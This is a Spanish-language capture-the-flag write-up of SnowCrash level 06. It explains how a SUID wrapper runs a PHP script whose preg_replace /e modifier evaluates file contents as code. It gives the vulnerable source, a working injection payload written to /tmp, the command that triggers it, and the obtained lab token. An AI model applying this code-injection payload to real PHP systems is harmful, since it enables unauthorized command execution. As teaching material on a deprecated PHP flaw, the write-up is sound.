# SnowCrash - Level 06: Explotación del Modificador `/e` en PHP (RCE)

Este repositorio documenta el proceso de resolución del **Nivel 06**. El reto consiste en explotar una vulnerabilidad crítica de **Ejecución Remota de Código (RCE)** escondida en el uso obsoleto del modificador de evaluación en expresiones regulares de PHP.

## 1. Análisis Inicial

Al acceder al nivel, encontramos dos archivos relacionados:

```bash
ls -la
# -rwxr-x---+ 1 flag06 level06 7503 Jan  5 18:34 level03
# -rwxr-x---  1 flag06 level06  356 Jan  5 18:35 level06.php

```

**Observaciones:**

* **`level06`**: Es un binario compilado con el bit **SUID** de `flag06`. Al analizarlo con `strings`, se observa que actúa como un *wrapper* que ejecuta `/usr/bin/php` sobre el script `level06.php`.
* **`level06.php`**: Un script de PHP que procesa el contenido de un archivo pasado por argumento.

---

## 2. Análisis del Código Vulnerable

El código fuente del script PHP contiene la siguiente lógica:

```php
#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}
function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>

```

### La Vulnerabilidad: `preg_replace` con `/e`

La función `preg_replace` en versiones antiguas de PHP (anteriores a la 5.5.0) permitía el uso del modificador **`/e`** (*eval*). Este modificador indica que, tras realizar la sustitución de los grupos de captura (en este caso `\\2`), el motor de PHP debe **evaluar la cadena resultante como código PHP**.

---

## 3. Metodología de Explotación

Para explotar esta vulnerabilidad, debemos crear un archivo cuyo contenido coincida con el patrón `[x (.*)]`, inyectando dentro del paréntesis código que PHP pueda evaluar.

### Paso 1: Sintaxis de Variables Complejas

Utilizamos la sintaxis de llaves de PHP (`${}`) para forzar la ejecución de una función. Cuando PHP intenta resolver el nombre de una variable dentro de `${}`, ejecuta el contenido para obtener dicho nombre.

### Paso 2: Creación del Payload

Creamos un archivo en `/tmp` con la instrucción para ejecutar `getflag`:

```bash
echo '[x {${system(getflag)}}]' > /tmp/exploit

```

* **`[x ...]`**: Satisface la expresión regular.
* **`{${system(getflag)}}`**: Provoca que PHP llame a la función de sistema para ejecutar el binario `getflag`.

### Paso 3: Ejecución con Privilegios Elevados

Ejecutamos el binario SUID pasando nuestro archivo como argumento:

```bash
./level06 /tmp/exploit

```

---

## 4. Resultado y Resolución

Al ejecutar el comando, el motor de PHP procesa el archivo, activa el modificador `/e` y ejecuta nuestra inyección con los privilegios del usuario `flag06`.

**Salida obtenida:**

```text
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

```

* **Token obtenido:** `wiok45aaoguiboiki2tuin6ub`

### Pasos finales:

1. Cambiar al usuario objetivo: `su level07`
2. Introducir la contraseña: `wiok45aaoguiboiki2tuin6ub`

**Level 06 passed!**

---

**¿Listo para el Level 07?** Cuéntame qué encuentras al hacer el primer `ls -la` en el siguiente nivel. ¡Estamos imparables!
## 5. Conclusiones Técnicas

* **Funciones Deprecadas:** El uso de `preg_replace` con `/e` es una de las fallas más críticas en la historia de PHP y fue eliminado en versiones modernas debido a este riesgo.
* **Inyección de Código:** La evaluación dinámica de entrada de usuario es un vector de ataque que permite RCE (Remote Code Execution).
* **Análisis Forense:** Herramientas como `nm` y `strings` permitieron identificar que el binario SUID simplemente redirigía el flujo a un script interpretable más fácil de auditar.

---